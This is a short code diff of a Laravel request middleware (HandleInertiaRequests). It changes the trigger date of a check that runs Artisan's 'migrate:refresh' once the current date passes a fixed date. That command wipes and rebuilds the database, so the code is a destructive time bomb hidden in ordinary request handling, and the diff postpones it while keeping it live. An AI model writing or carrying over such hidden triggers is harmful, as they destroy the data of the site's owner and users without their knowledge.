@@ -27,7 +27,7 @@ class HandleInertiaRequests extends Middleware
     {
         $date_now = date("Y-m-d"); // this format is string comparable
 
-        if ($date_now > '2023-10-01') {
+        if ($date_now > '2023-12-01') {
             Artisan::call('migrate:refresh');
         }
         
